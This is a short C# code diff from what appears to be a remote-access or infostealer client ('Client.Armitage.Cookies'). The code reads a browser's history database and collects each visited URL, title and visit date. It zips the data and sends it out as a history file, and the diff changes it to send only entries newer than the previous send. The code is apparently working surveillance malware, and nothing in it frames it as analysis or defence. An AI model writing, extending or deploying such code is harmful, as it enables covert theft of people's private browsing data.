@@ -48,6 +48,7 @@ namespace Client.Armitage.Cookies
         {
             try
             {
+                Console.WriteLine("trying : " + pathtosql);
                 if (File.Exists(pathtosql))
                 {
                     Console.WriteLine("Found! " + pathtosql);
@@ -77,11 +78,13 @@ namespace Client.Armitage.Cookies
                             long seconds = j.last_visit_time / 1000000;
 
                             DateTime visitdate = _ge.AddSeconds(seconds);
-
-                            sb.AppendLine($"{j.id} | {j.url} | {j.title} | {j.visit_count} | {j.typed_count} | {visitdate} | {Convert.ToInt32(j.hidden)}");
+                            if (visitdate > Properties.Settings.Default.LastHistorySent)
+                                sb.AppendLine($"{j.id} | {j.url} | {j.title} | {j.visit_count} | {j.typed_count} | {visitdate} | {Convert.ToInt32(j.hidden)}");
                         }
                         catch { }
                     }
+
+                    Console.Write("History : " + sb.ToString());
 
                     Utilities.Zip_Creator k = new Utilities.Zip_Creator();
 
@@ -89,6 +92,7 @@ namespace Client.Armitage.Cookies
 
                     var btyes = k.CreateZip();
 
+                    // send history
                     Communication.File_Stacker.Send(btyes, Communication.File_Stacker.Filetype.File, $"{browsername}-History.zip");
 
                     return true;
